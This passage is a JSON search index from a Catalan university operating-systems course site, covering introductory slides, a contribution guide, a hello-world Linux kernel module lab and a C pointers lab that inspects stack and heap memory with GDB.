    "text": "Reptes en el disseny dels SO (II)\n\nMaximitzar la fiabilitat: Els sistemes han de fer el que estan dissenyats per fer en tots els casos, fins i tot en cas d‚Äôerrors inesperats.\nMaximitzar la disponibilitat: Els sistemes han d‚Äôestar disponibles per a l‚Äô√∫s quan els usuaris ho necessiten, minimitzant el temps d‚Äôaturada i reparaci√≥ causat per fallades.\nSeguretat: Els sistemes han de protegir-se contra accions malicioses i accidents involuntaris.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#exemples-de-disseny-so-i",
    "href": "slides/01-introduction.html#exemples-de-disseny-so-i",
    "title": "Introducci√≥",
    "section": "Exemples de Disseny SO (I)",
    "text": "Exemples de Disseny SO (I)\nVehicle\n\nUn vehicle aut√≤nom ha de ser segur per als passatgers i per a la gent que hi ha al seu voltant. Ha de garantir que el vehicle no es pugui controlar de forma remota per un atacant. Tamb√© ha de ser tolerant a fallades i recuperar-se d‚Äôerrors sense posar en perill la seguretat dels passatgers.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#reptes-en-el-disseny-dels-so-iii",
    "href": "slides/01-introduction.html#reptes-en-el-disseny-dels-so-iii",
    "title": "Introducci√≥",
    "section": "Reptes en el disseny dels so (III)",
    "text": "Reptes en el disseny dels so (III)\n\nEscalables: Els sistemes han de funcionar b√© quan s‚Äôafegeixen recursos (usuaris, processos, ‚Ä¶) o quan es redueixen.\nMantenibles: Els sistemes han de ser f√†cils de mantenir i evolucionar al llarg del temps.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#exemples-de-disseny-so-i-1",
    "href": "slides/01-introduction.html#exemples-de-disseny-so-i-1",
    "title": "Introducci√≥",
    "section": "Exemples de Disseny SO (I)",
    "text": "Exemples de Disseny SO (I)\nTel√®fon m√≤bil\n\nEscalable perqu√® el nombre d‚Äôusuaris pot augmentar molt r√†pidament.\nMantenible perqu√® els usuaris esperen actualitzacions peri√≤diques del sistema operatiu.\nA m√©s a m√©s, aquestes actualitzacions s‚Äôhan de poder instal¬∑lar de forma transparent i sense afectar el funcionament del tel√®fon.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#per-qu√®-estudiar-so-i",
    "href": "slides/01-introduction.html#per-qu√®-estudiar-so-i",
    "title": "Introducci√≥",
    "section": "Per qu√® estudiar SO? (I)",
    "text": "Per qu√® estudiar SO? (I)\n\nS√≥n la base dels sistemes inform√†tics. (IoT, Servidors, M√≤bils, PC, ‚Ä¶).\nEns permeten entendre com funciona realment un sistema inform√†tic.\nEls conceptes s√≥n aplicables a altres sistemes i problemes quotidians (planificaci√≥ de tasques).\nOptimitzar el rendiment de les aplicacions.\nCompendre les vulnerabilitats, proteccions i mitigacions de riscos de seguretat.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#per-qu√®-estudiar-so-ii",
    "href": "slides/01-introduction.html#per-qu√®-estudiar-so-ii",
    "title": "Introducci√≥",
    "section": "Per qu√® estudiar SO? (II)",
    "text": "Per qu√® estudiar SO? (II)\n\n\nLa comprensi√≥ en les decisions de disseny dels sistemes operatius i el raonament sobre els pros/contra us permetr√† rescatar idees obsoletes que poden ser √∫tils en el futur dels nous sistemes inform√†tics.\n\n\nEn particular, sovint passa que un canvi en la tecnologia fa que alguns idea obsoleta i r√†pidament desapareix. No obstant aix√≤, un altre canvi tecnol√≤gic podria tornar-lo a reviure. Aix√≤ √©s especialment cert quan el canvi t√© a veure amb el rendiment relatiu de les diferents parts del sistema. Per exemple, quan les CPUs es van fer molt m√©s r√†pides que les Mem√≤ries les caches van gaunyar molta importancia, per√≤ que passa si en un futur les mem√≤ries s√≥n molt m√©s r√†pides que les CPUs? En aquest cas, les caches ja no serien necess√†ries. En biologia, l‚Äôextinci√≥ √©s per sempre, per√≤ en inform√†tica, de vegades nom√©s √©s per uns quants anys.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#conclusions",
    "href": "slides/01-introduction.html#conclusions",
    "title": "Introducci√≥",
    "section": "Conclusions",
    "text": "Conclusions\n\nEls sistemes operatius estan presents en tots els dispositius que fem servir.\nEl disseny es complex i requereix integrar dispositius diferents (forma,espai,temps).\nEns proporciones una il¬∑lusi√≥ d‚Äôuna m√†quina virtual infinita.\n√âs il¬∑lusionista, √°rbrit i proporciona un conjunt de serveis comuns per permetre la interacci√≥ entre programari i maquinari.\nT√© cura del rendiment, seguretat, portabilitat i fiabilitat.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "slides/01-introduction.html#aix√≤-√©s-tot-per-avui",
    "href": "slides/01-introduction.html#aix√≤-√©s-tot-per-avui",
    "title": "Introducci√≥",
    "section": "Aix√≤ √©s tot per avui",
    "text": "Aix√≤ √©s tot per avui\n\n\nPreguntes?\n\nTAKE HOME MESSAGE\nEls sistemes operatius ajuden als programadors a desenvolupar programari robust de forma independent del maquinari.",
    "crumbs": [
      "Diapositives",
      "Unitat 01 ¬∑ Introducci√≥ als sistemes operatius"
    ]
  },
  {
    "objectID": "index.html",
    "href": "index.html",
    "title": "SO 105012: Sistemes Operatius",
    "section": "",
    "text": "Benvinguts al curs de Sistemes Operatius (SO) del Grau d‚ÄôEnginyeria Inform√†tica de la Universitat de Lleida (UdL). Aquest curs se centra en l‚Äôestudi dels principis fonamentals de disseny i implementaci√≥ en l‚Äôenginyeria de sistemes operatius. Les classes es basen en l‚Äôestudi de sistemes operatius basats en UNIX i en tasques de recerca. Alguns dels temes tractats inclouen la gesti√≥ de processos, els mecanismes de comunicaci√≥, la planificaci√≥ de tasques i la gesti√≥ de mem√≤ria. Les tasques de laboratori individuals requereixen codificar en C mitjan√ßant crides al sistema i scripts de shell.\n\n\n\nCourse Title\nOperating Systems\n\n\nSemester\n1st Semester of the Bachelor‚Äôs Degree in Computer Engineering\n\n\nCourse Year\nSecond Year\n\n\nProfessor\nJordi Mateo\n\n\nSchedule\nüìÖ\n\n\nCourse Guide\nüìö\n\n\nSchool\n\n\n\nUniversity\n\n\n\nDepartment"
  },
  {
    "objectID": "CONTRIBUTING.html",
    "href": "CONTRIBUTING.html",
    "title": "Contribueix",
    "section": "",
    "text": "Aquest material √©s de codi obert i podeu col¬∑laborar-hi, complementar-lo o corregir-lo mitjan√ßant pull requests al repositori.\n\n\n\nFork el repositori: Fes clic al bot√≥ Fork a la part superior dreta de la p√†gina. Aix√≤ crear√† una c√≤pia del repositori al teu compte de GitHub. Veure imatge:\n\n\n\n\nClona el repositori a la teva m√†quina: Utilitza Git per clonar el repositori que has clonat a la teva m√†quina.\nCrea una branca (branch) nova: Abans de fer canvis, crea una branca nova on far√†s les teves modificacions. Aix√≤ ajuda a mantenir les coses ordenades. Utilitza la comanda seg√ºent:\n\ngit checkout -b nom_de_la_branca\n\nFes els canvis: Realitza les modificacions necess√†ries en els fitxers del projecte.\nAfegeix i commiteja els canvis: Utilitza els seg√ºents comandos per afegir els canvis i fer un commit.\nPuja els canvis al teu repositori a GitHub amb la comanda seg√ºent:\n\ngit push origin nom_de_la_branca\n\nCrea una PR: V√©s al teu repositori a GitHub i selecciona la branca on has fet els canvis. Apareixer√† un missatge destacat dient que has fet una nova branca. Fes clic a ‚ÄúCompare & pull request‚Äù per comen√ßar la PR.\n\nTamb√©, pots anar a la nova branca fent click al menu desplegable i seleccionant la branca que has creat 1 i fent click al bot√≥ New pull request 2. Veure imatge:\n\n\nProporciona una descripci√≥ detallada dels canvis que has fet. A m√©s, pots afegir captures de pantalla o informaci√≥ addicional per ajudar els revisors a entendre els teus canvis. Fes clic a New pull request i beuras una pantalla com la seg√ºent:\n\n\n1 Indica el meu repositori (on vols enviar les modificacions) i 2 indica el teu fork (on has fet les modificacions). Assegura‚Äôt de seleccionar la branca amb les modificacions 3. Finalment, fes clic a Create pull request 4.\n\nEnvia la PR: Un cop hagis omplert tota la informaci√≥, fes clic al bot√≥ ‚ÄúCreate pull request‚Äù per enviar la PR al projecte original.\n\n\n\n\nPer editar el material:\n\nAl teu ordinador, necessitareu instal¬∑lar Quarto.\nDirectament al navegador, podeu editar els fitxers .qmd fent clic al bot√≥ de llapis que apareix a la part superior dreta de cada fitxer. Aix√≤ crear√† una nova branca amb els teus canvis i et permetr√† fer una PR directament des del navegador.\n\n\n\nAbans de comen√ßar, assegura‚Äôt que tens Quarto instal¬∑lat al teu ordinador. Obra un terminal o un IDE com VSCode i navega fins a la carpeta on tens el projecte.\nPer veure una previsualitzaci√≥ local del lloc web:\nquarto preview\nAix√≤ obrir√† una previsualitzaci√≥ local al teu navegador. La previsualitzaci√≥ s‚Äôactualitza autom√†ticament quan deses els canvis.\n\n\n\nEs pot integrar amb Visual Studio Code (VSCode) per a una millor experi√®ncia d‚Äôedici√≥. Si no tens VSCode, pots descarregar-lo des de https://code.visualstudio.com/.\n\nQuarto: Edici√≥ en mode visual: Permet editar els fitxers .qmd en un mode visual que facilita l‚Äô√∫s de les funcions de Quarto.\nQuarto: Previsualitzaci√≥: Obre una previsualitzaci√≥ del fitxer .qmd actual.\nQuarto: Edici√≥ en mode font: Torna a l‚Äôedici√≥ en mode text pla."
  },
  {
    "objectID": "CONTRIBUTING.html#instruccions-per-contribu√Ør",
    "href": "CONTRIBUTING.html#instruccions-per-contribu√Ør",
    "title": "Contribueix",
    "section": "",
    "text": "Fork el repositori: Fes clic al bot√≥ Fork a la part superior dreta de la p√†gina. Aix√≤ crear√† una c√≤pia del repositori al teu compte de GitHub. Veure imatge:\n\n\n\n\nClona el repositori a la teva m√†quina: Utilitza Git per clonar el repositori que has clonat a la teva m√†quina.\nCrea una branca (branch) nova: Abans de fer canvis, crea una branca nova on far√†s les teves modificacions. Aix√≤ ajuda a mantenir les coses ordenades. Utilitza la comanda seg√ºent:\n\ngit checkout -b nom_de_la_branca\n\nFes els canvis: Realitza les modificacions necess√†ries en els fitxers del projecte.\nAfegeix i commiteja els canvis: Utilitza els seg√ºents comandos per afegir els canvis i fer un commit.\nPuja els canvis al teu repositori a GitHub amb la comanda seg√ºent:\n\ngit push origin nom_de_la_branca\n\nCrea una PR: V√©s al teu repositori a GitHub i selecciona la branca on has fet els canvis. Apareixer√† un missatge destacat dient que has fet una nova branca. Fes clic a ‚ÄúCompare & pull request‚Äù per comen√ßar la PR.\n\nTamb√©, pots anar a la nova branca fent click al menu desplegable i seleccionant la branca que has creat 1 i fent click al bot√≥ New pull request 2. Veure imatge:\n\n\nProporciona una descripci√≥ detallada dels canvis que has fet. A m√©s, pots afegir captures de pantalla o informaci√≥ addicional per ajudar els revisors a entendre els teus canvis. Fes clic a New pull request i beuras una pantalla com la seg√ºent:\n\n\n1 Indica el meu repositori (on vols enviar les modificacions) i 2 indica el teu fork (on has fet les modificacions). Assegura‚Äôt de seleccionar la branca amb les modificacions 3. Finalment, fes clic a Create pull request 4.\n\nEnvia la PR: Un cop hagis omplert tota la informaci√≥, fes clic al bot√≥ ‚ÄúCreate pull request‚Äù per enviar la PR al projecte original."
  },
  {
    "objectID": "CONTRIBUTING.html#edici√≥-del-material",
    "href": "CONTRIBUTING.html#edici√≥-del-material",
    "title": "Contribueix",
    "section": "",
    "text": "Per editar el material:\n\nAl teu ordinador, necessitareu instal¬∑lar Quarto.\nDirectament al navegador, podeu editar els fitxers .qmd fent clic al bot√≥ de llapis que apareix a la part superior dreta de cada fitxer. Aix√≤ crear√† una nova branca amb els teus canvis i et permetr√† fer una PR directament des del navegador.\n\n\n\nAbans de comen√ßar, assegura‚Äôt que tens Quarto instal¬∑lat al teu ordinador. Obra un terminal o un IDE com VSCode i navega fins a la carpeta on tens el projecte.\nPer veure una previsualitzaci√≥ local del lloc web:\nquarto preview\nAix√≤ obrir√† una previsualitzaci√≥ local al teu navegador. La previsualitzaci√≥ s‚Äôactualitza autom√†ticament quan deses els canvis.\n\n\n\nEs pot integrar amb Visual Studio Code (VSCode) per a una millor experi√®ncia d‚Äôedici√≥. Si no tens VSCode, pots descarregar-lo des de https://code.visualstudio.com/.\n\nQuarto: Edici√≥ en mode visual: Permet editar els fitxers .qmd en un mode visual que facilita l‚Äô√∫s de les funcions de Quarto.\nQuarto: Previsualitzaci√≥: Obre una previsualitzaci√≥ del fitxer .qmd actual.\nQuarto: Edici√≥ en mode font: Torna a l‚Äôedici√≥ en mode text pla."
  },
  {
    "objectID": "labs/04-kernel/lab01.html",
    "href": "labs/04-kernel/lab01.html",
    "title": "Laboratori 9: Programaci√≥ de m√≤duls per al Kernel de Linux",
    "section": "",
    "text": "En aquest laboratori aprendrem a programar m√≤duls per al kernel de Linux. Aquesta √©s una de les tasques m√©s complexes que es poden fer en el m√≥n de la programaci√≥ de sistemes. Per aix√≤, realitzarem uns exemples senzills per a entendre com es programen els m√≤duls i com es poden integrar al kernel.",
    "crumbs": [
      "Laboratoris",
      "Unitat 02",
      "Laboratori 9 ¬∑ Programaci√≥ de m√≤duls per al Kernel de Linux"
    ]
  },
  {
    "objectID": "labs/04-kernel/lab01.html#requisits-previs",
    "href": "labs/04-kernel/lab01.html#requisits-previs",
    "title": "Laboratori 9: Programaci√≥ de m√≤duls per al Kernel de Linux",
    "section": "Requisits previs",
    "text": "Requisits previs\n\nM√†quina virtual amb Debian.\nRealitzar una snapshot de la m√†quina virtual abans de comen√ßar el laboratori.\nProgramari necessari:\n\nEines de construcci√≥ de programari: build-essential\nCap√ßaleres del kernel: linux-headers-$(uname -r)\nAltres eines: libncurses-dev, bison, flex, kmod\nInstal¬∑laci√≥ de les eines necess√†ries:\nsu -c \"apt update && apt upgrade -y\"\nsu -c \"apt install build-essential linux-headers-$(uname -r) libncurses-dev bison flex kmod -y\"",
    "crumbs": [
      "Laboratoris",
      "Unitat 02",
      "Laboratori 9 ¬∑ Programaci√≥ de m√≤duls per al Kernel de Linux"
    ]
  },
  {
    "objectID": "labs/04-kernel/lab01.html#tasques",
    "href": "labs/04-kernel/lab01.html#tasques",
    "title": "Laboratori 9: Programaci√≥ de m√≤duls per al Kernel de Linux",
    "section": "Tasques",
    "text": "Tasques\n\nExplorant el kernel\n\nObtenir informaci√≥ sobre la versi√≥ del kernel actual:\nuname -r\nEn el meu cas, la versi√≥ del kernel √©s 6.1.0-39-arm64.\nPer veure els m√≤duls carregats al kernel, podem fer servir la comanda lsmod:\nsu -c \"lsmod\"\nTamb√© podem fer servir la comanda cat per llegir el fitxer /proc/modules:\nsu -c \"cat /proc/modules\"\nSi volem filtrar un m√≤dul concret, podem fer servir la comanda grep:\nsu -c \"lsmod | grep fat\"\n\nEls moduls del kernel registren la informaci√≥ de log en una consola, per√≤ per defecte no la podreu veure per la sortida est√†ndard (sdtout) o la sortida d‚Äôerror (stderr). Per veure aquesta informaci√≥, necessitarem fer servir la comanda dmesg.\nPer exemple, si volem veure els √∫ltims missatges del kernel, podem fer servir la comanda:\nsu -c \"dmesg | tail -n 10\"\nAquest missatge provenen dels m√≤duls del kernel que utilitzen la funci√≥ printk per imprimir informaci√≥ de log. Aquesta funci√≥ permet especificar el nivell de log i el m√≤dul que genera el missatge. Per canviar el nivell de log, podem fer servir la comanda dmesg amb l‚Äôopci√≥ -n:\nsu -c \"dmesg -n 4\"\nEn aquest cas, el nivell de log √©s 4, que correspon a WARNING. Aix√≤ significa que nom√©s es mostraran els missatges de log amb nivell WARNING o superior.\nNivells de log disponibles:\n\n0: KERN_EMERG: Missatges d‚Äôemerg√®ncia.\n1: KERN_ALERT: Missatges d‚Äôalerta.\n2: KERN_CRIT: Missatges cr√≠tics.\n3: KERN_ERR: Missatges d‚Äôerror.\n4: KERN_WARNING: Missatges d‚Äôav√≠s.\n5: KERN_NOTICE: Missatges de notificaci√≥.\n6: KERN_INFO: Missatges d‚Äôinformaci√≥.\n7: KERN_DEBUG: Missatges de depuraci√≥.\n8: KERN_DEFAULT: Nivell per defecte.\n\n\n\nProgramant un m√≤dul\nEn aquesta secci√≥, programarem un m√≤dul senzill per al kernel de Linux. Aquest m√≤dul imprimir√† un missatge d‚Äôinici i un missatge de finalitzaci√≥ quan es carregui i descarregui al kernel.\n\nCreem un directori per al nostre m√≤dul:\nmkdir -p $HOME/kernel\ncd $HOME/kernel\nCreem un fitxer anomenat hello.c amb el seg√ºent contingut:\n#include &lt;linux/kernel.h&gt;\n#include &lt;linux/module.h&gt; \n\nMODULE_LICENSE(\"GPL\");\n\nint init_module(void) {\n    printk(KERN_INFO \"Hello, world!\\n\");\n    return 0;\n}\n\nvoid cleanup_module(void) {\n    printk(KERN_INFO \"Goodbye, world!\\n\");\n}\nCrearem un fitxer Makefile per compilar el nostre m√≤dul amb el seg√ºent contingut:\nCONFIG_MODULE_SIG=n\nobj-m += hello.o\n\nall:\n    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules\n\nclean:\n    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean\n\nNota:\n\nEl fitxer Makefile √©s sensible a la indentaci√≥. Assegureu-vos que utilitzeu tabuladors en lloc d‚Äôespais.\nLa variable obj-m indica quin √©s el m√≤dul que volem compilar.\nLa variable PWD cont√© la ruta del directori actual.\n$(shell uname -r) retorna la versi√≥ del kernel actual.\nCONFIG_MODULE_SIG=n desactiva la verificaci√≥ de la signatura del m√≤dul.\n\n\nCompil¬∑lem el nostre m√≤dul amb la comanda make:\nmake\n\nTroubleshooting:\n\nSi obteniu un error de missing separator, assegureu-vos que utilitzeu tabuladors en lloc d‚Äôespais.\nSi obteniu un error de /lib/modules/, assegureu-vos que teniu instal¬∑lat el paquet linux-headers.\nSi obteniu un error de missing MODULE_LICENSE(), podeu afegir la seg√ºent l√≠nia al vostre fitxer hello.c:\n\n\nCarreguem el nostre m√≤dul amb la comanda insmod:\nsu -\ninsmod /home/jordi/laboratoris/lab2-kernel/kernel-modules/hello.ko\n\nNota: Si teniu errors assegureu-vos que esteu executant la comanda com a root. Quan canviem a l‚Äôusuari root, la variable $HOME canvia a /root. Per tant, assegureu-vos d‚Äôapuntar a la ruta correcta.\n\nComprovem que el m√≤dul s‚Äôha carregat correctament amb la comanda lsmod:\nlsmod | grep hello\nSi el m√≤dul s‚Äôha carregat correctament, veureu una sortida similar a aquesta:\nhello                 16384  0\nComprovem els missatges del kernel amb la comanda dmesg:\nsu -c \"dmesg\"\nSi tot ha anat b√©, veureu els missatges Hello, world! al final de la sortida.\nDescarreguem el m√≤dul amb la comanda rmmod:\nrmmod hello\nComprovem que el m√≤dul s‚Äôha descarregat correctament amb la comanda lsmod:\nlsmod | grep hello\nSi el m√≤dul s‚Äôha descarregat correctament, haur√≠eu de veure el missatge Goodbye, world! al final de la sortida de dmesg.\n\nEs poden fer diferents millores i moduls m√©s complexos, per√≤ aquest √©s un exemple senzill per a comen√ßar a programar m√≤duls per al kernel de Linux. Per exemple, podeu afegir m√©s informaci√≥ al m√≤dul com llic√®ncia, autor, descripci√≥ i versi√≥. Tamb√© podeu utilitzar les macros __init i __exit per optimitzar el m√≤dul i reduir la mem√≤ria utilitzada.\nPer exemple, aqu√≠ teniu un exemple millorat del m√≤dul hello.c:\n#include &lt;linux/init.h&gt;\n#include &lt;linux/module.h&gt;\n#include &lt;linux/kernel.h&gt;\n\nMODULE_LICENSE(\"GPL\");\nMODULE_AUTHOR(\"Jordi Mateo\");\nMODULE_DESCRIPTION(\"Hello World OS Kernel Module\");\nMODULE_VERSION(\"0.1\");\n\nstatic int __init hello_init(void) {\n    printk(KERN_INFO \"WOW I AM A KERNEL HACKER!!!\\n\");\n    return 0;\n}\n\nstatic void __exit hello_cleanup(void) {\n    printk(KERN_INFO \"I am dead.\\n\");\n}\n\nmodule_init(hello_init);\nmodule_exit(hello_cleanup);",
    "crumbs": [
      "Laboratoris",
      "Unitat 02",
      "Laboratori 9 ¬∑ Programaci√≥ de m√≤duls per al Kernel de Linux"
    ]
  },
  {
    "objectID": "labs/02-c-pointers/lab01.html",
    "href": "labs/02-c-pointers/lab01.html",
    "title": "Laboratori 6: Punters, Stack i Heap en C",
    "section": "",
    "text": "Com es guarden les dades a la stack i a la heap.\nLa difer√®ncia entre una matriu est√†tica i una matriu din√†mica.\nEl paper dels punters en l‚Äôassignaci√≥ de mem√≤ria.\nCom explorar la mem√≤ria amb GDB.",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 6 ¬∑ Punters¬∑Heap¬∑Stack en C"
    ]
  },
  {
    "objectID": "labs/02-c-pointers/lab01.html#objectius",
    "href": "labs/02-c-pointers/lab01.html#objectius",
    "title": "Laboratori 6: Punters, Stack i Heap en C",
    "section": "",
    "text": "Com es guarden les dades a la stack i a la heap.\nLa difer√®ncia entre una matriu est√†tica i una matriu din√†mica.\nEl paper dels punters en l‚Äôassignaci√≥ de mem√≤ria.\nCom explorar la mem√≤ria amb GDB.",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 6 ¬∑ Punters¬∑Heap¬∑Stack en C"
    ]
  },
  {
    "objectID": "labs/02-c-pointers/lab01.html#codi-base-per-al-laboratori",
    "href": "labs/02-c-pointers/lab01.html#codi-base-per-al-laboratori",
    "title": "Laboratori 6: Punters, Stack i Heap en C",
    "section": "Codi base per al laboratori",
    "text": "Codi base per al laboratori\nUtilitzarem el seg√ºent codi base per al laboratori. Aquest codi crea una matriu est√†tica i una din√†mica, i imprimeix els valors i les adreces de mem√≤ria corresponents.\n#include &lt;stdio.h&gt;\n#include &lt;stdlib.h&gt;\n\nint main() {\n    // Matriu EST√ÄTICA: a la pila (stack)\n    int m[2][3] = { {1, 2, 3}, {4, 5, 6} };\n\n    printf(\"Matriu EST√ÄTICA (m):\\n\");\n    for (int i = 0; i &lt; 2; i++) {\n        for (int j = 0; j &lt; 3; j++) {\n            printf(\"m[%d][%d] = %d (adre√ßa: %p)\\n\",\n                   i, j, m[i][j], &m[i][j]);\n        }\n    }\n\n    // Matriu DIN√ÄMICA: a la mem√≤ria heap\n    int **matrix = malloc(2 * sizeof(int *));  // espai per 2 files\n\n    for (int i = 0; i &lt; 2; i++) {\n        matrix[i] = malloc(3 * sizeof(int));  // espai per 3 enters\n    }\n\n    // Copiem els valors de la matriu est√†tica\n    for (int i = 0; i &lt; 2; i++) {\n        for (int j = 0; j &lt; 3; j++) {\n            matrix[i][j] = m[i][j];\n        }\n    }\n\n    printf(\"\\nMatriu DIN√ÄMICA (matrix):\\n\");\n    for (int i = 0; i &lt; 2; i++) {\n        for (int j = 0; j &lt; 3; j++) {\n            printf(\"matrix[%d][%d] = %d (adre√ßa: %p)\\n\",\n                   i, j, matrix[i][j], &matrix[i][j]);\n        }\n    }\n\n    // Alliberem la mem√≤ria del heap\n    for (int i = 0; i &lt; 2; i++) {\n        free(matrix[i]);\n    }\n    free(matrix);\n\n    return 0;\n}\nSi compileu i executeu aquest codi, veureu que les adreces de la matriu est√†tica m estan a la pila (stack), mentre que les adreces de la matriu din√†mica matrix estan a la mem√≤ria heap:\ngcc -g lab01.c -o lab01\n./lab01\nMatriu EST√ÄTICA (m):\nm[0][0] = 1 (adre√ßa: 0xffffde4ce200)\nm[0][1] = 2 (adre√ßa: 0xffffde4ce204)\nm[0][2] = 3 (adre√ßa: 0xffffde4ce208)\nm[1][0] = 4 (adre√ßa: 0xffffde4ce20c)\nm[1][1] = 5 (adre√ßa: 0xffffde4ce210)\nm[1][2] = 6 (adre√ßa: 0xffffde4ce214)\n\nMatriu DIN√ÄMICA (matrix):\nmatrix[0][0] = 1 (adre√ßa: 0xaaaae56f96d0)\nmatrix[0][1] = 2 (adre√ßa: 0xaaaae56f96d4)\nmatrix[0][2] = 3 (adre√ßa: 0xaaaae56f96d8)\nmatrix[1][0] = 4 (adre√ßa: 0xaaaae56f96f0)\nmatrix[1][1] = 5 (adre√ßa: 0xaaaae56f96f4)\nmatrix[1][2] = 6 (adre√ßa: 0xaaaae56f96f8)\nSi dibuixem un mapa de la mem√≤ria d‚Äôaquest programa, molt simplificat, tindr√≠em:\n\nOn:\n\n@m: √©s la base de la matriu est√†tica, i com a variable local est√† al stack. Els seus elements tamb√© s√≥n al stack utilitzant adreces consecutives.\n@matrix: √©s el punter a la matriu din√†mica, i com a variable local tamb√© est√† al stack.\n@matrix[0], @matrix[1]: s√≥n punters que apunten a blocs de mem√≤ria al heap, on s‚Äôhan assignat espai per a les files de la matriu din√†mica.\n@z: √©s l‚Äôadre√ßa del punter matrix al stack.",
    "crumbs": [
      "Laboratoris",
      "Unitat 01",
      "Laboratori 6 ¬∑ Punters¬∑Heap¬∑Stack en C"
    ]
  },
  {
    "objectID": "labs/02-c-pointers/lab01.html#tasques",
    "href": "labs/02-c-pointers/lab01.html#tasques",
    "title": "Laboratori 6: Punters, Stack i Heap en C",
    "section": "Tasques",
    "text": "Tasques\n\nCompilar i execuci√≥ amb GDB\n\nCompila el codi amb les opcions de depuraci√≥: gcc -g lab01.c -o lab01.\nExecuta el programa amb GDB: gdb ./lab01.\n\n\n\n\n\n\n\nAlertaGDB no est√† instal¬∑lat?\n\n\n\nAssegura‚Äôt de tenir GDB instal¬∑lat al teu sistema. Per instal¬∑lar-lo, pots utilitzar el gestor de paquets del teu sistema (per exemple, su -c \"apt-get install gdb -y\" a Debian).\n\n\n\n\nExploraci√≥ de la mem√≤ria amb GDB\nUn cop dins GDB, utilitza els seg√ºents comandos per a explorar el programa:\n\nbreak main per posar un punt d‚Äôinterrupci√≥ al principi de la funci√≥ main.\n(gdb) break main\nBreakpoint 1 at 0x860: file lab01.c, line 6.\nrun per iniciar l‚Äôexecuci√≥ del programa.\n(gdb) run\nStarting program: /home/jordi/c/pointers/lab01\n[Thread debugging using libthread_db enabled]\nUsing host libthread_db library \"/lib/aarch64-linux-gnu/libthread_db.so.1\".\n\nBreakpoint 1, main () at lab01.c:6\n6       int m[2][3] = { {1, 2, 3}, {4, 5, 6} };\nObserva que l‚Äôexecuci√≥ s‚Äôha aturat a la l√≠nia 6, just abans de la declaraci√≥ de la matriu est√†tica m.\nAra posem un altre punt d‚Äôinterrupci√≥ just abans del primer malloc per a la matriu din√†mica:\n(gdb) break 17\nBreakpoint 2 at 0xaaaaaaaa093c: file lab01.c, line 18.\nContinuem l‚Äôexecuci√≥ fins a aquest punt:\n(gdb) c\nContinuing.\nMatriu EST√ÄTICA (m):\nm[0][0] = 1 (adre√ßa: 0xfffffffff2a0)\nm[0][1] = 2 (adre√ßa: 0xfffffffff2a4)\nm[0][2] = 3 (adre√ßa: 0xfffffffff2a8)\nm[1][0] = 4 (adre√ßa: 0xfffffffff2ac)\nm[1][1] = 5 (adre√ßa: 0xfffffffff2b0)\nm[1][2] = 6 (adre√ßa: 0xfffffffff2b4)\n\nBreakpoint 2, main () at lab01.c:17\n17      int **matrix = malloc(2 * sizeof(int *));  // espai per 2 files\nAra estem just abans de l‚Äôassignaci√≥ de mem√≤ria din√†mica. Podem comen√ßar a inspeccionar la pila i la mem√≤ria heap.\n\n(gdb) info proc mappings\nprocess 1404\nMapped address spaces:\n    Start Addr           End Addr       Size     Offset  Perms  objfile\n0xaaaaaaaa0000     0xaaaaaaaa1000     0x1000        0x0  r-xp   /home/jordi/c/pointers/lab01\n0xaaaaaaabf000     0xaaaaaaac0000     0x1000     0xf000  r--p   /home/jordi/c/pointers/lab01\n0xaaaaaaac0000     0xaaaaaaac1000     0x1000    0x10000  rw-p   /home/jordi/c/pointers/lab01\n0xaaaaaaac1000     0xaaaaaaae2000    0x21000        0x0  rw-p   [heap]\n0xfffff7e00000     0xfffff7f8b000   0x18b000        0x0  r-xp   /usr/lib/aarch64-linux-gnu/libc.so.6\n0xfffff7f8b000     0xfffff7f9c000    0x11000   0x18b000  ---p   /usr/lib/aarch64-linux-gnu/libc.so.6\n0xfffff7f9c000     0xfffff7fa0000     0x4000   0x18c000  r--p   /usr/lib/aarch64-linux-gnu/libc.so.6\n0xfffff7fa0000     0xfffff7fa2000     0x2000   0x190000  rw-p   /usr/lib/aarch64-linux-gnu/libc.so.6\n0xfffff7fa2000     0xfffff7faf000     0xd000        0x0  rw-p\n0xfffff7fbe000     0xfffff7fe5000    0x27000        0x0  r-xp   /usr/lib/aarch64-linux-gnu/ld-linux-aarch64.so.1\n0xfffff7ff7000     0xfffff7ff9000     0x2000        0x0  rw-p\n0xfffff7ff9000     0xfffff7ffb000     0x2000        0x0  r--p   [vvar]\n0xfffff7ffb000     0xfffff7ffc000     0x1000        0x0  r-xp   [vdso]\n0xfffff7ffc000     0xfffff7ffe000     0x2000    0x2e000  r--p   /usr/lib/aarch64-linux-gnu/ld-linux-aarch64.so.1\n0xfffff7ffe000     0xfffff8000000     0x2000    0x30000  rw-p   /usr/lib/aarch64-linux-gnu/ld-linux-aarch64.so.1\n0xfffffffdf000    0x1000000000000    0x21000        0x0  rw-p   [stack]   \n\n\n\n\n\n\nNotaMapa de mem√≤ria\n\n\n\nEn aquest cas, la mem√≤ria heap comen√ßa a l‚Äôadre√ßa 0xaaaaaaac1000 i acaba a 0xaaaaaaae2000 amb una mida de 0x21000 bytes (135168 bytes). La pila d‚Äôexecuci√≥ (stack) comen√ßa a 0xfffffffdf000 i s‚Äôest√©n fins a 0x1000000000000.\n\n\n\nTamb√© podem consultar les variables locals amb info locals.\n(gdb) info locals\nm = 